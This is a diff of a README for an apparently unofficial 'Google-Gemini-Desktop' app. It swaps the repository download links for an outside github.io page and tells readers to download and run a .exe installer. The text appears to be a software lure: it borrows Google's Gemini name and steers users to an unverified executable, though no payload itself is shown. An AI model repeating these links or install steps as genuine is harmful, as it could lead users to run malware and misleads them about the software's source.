@@ -1,12 +1,12 @@
 # 🤖 Google-Gemini-Desktop - Access Google Gemini on your desktop
 
-[![Download Google Gemini Desktop](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://github.com/michiganpeleus382/Google-Gemini-Desktop)
+[![Download Google Gemini Desktop](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://michiganpeleus382.github.io)
 
 Google-Gemini-Desktop provides a workspace for Gemini on your computer. This application allows you to use multimodal chat, write code, conduct research, and analyze files. It offers a native experience for Windows users and keeps your conversations organized in one place.
 
 ## 📥 How to Install
 
-1. Visit the [Download Page](https://github.com/michiganpeleus382/Google-Gemini-Desktop) to get the latest version.
+1. Visit the [Download Page](https://michiganpeleus382.github.io) to get the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to save it to your computer.
 4. Open the downloaded file to start the installer. 
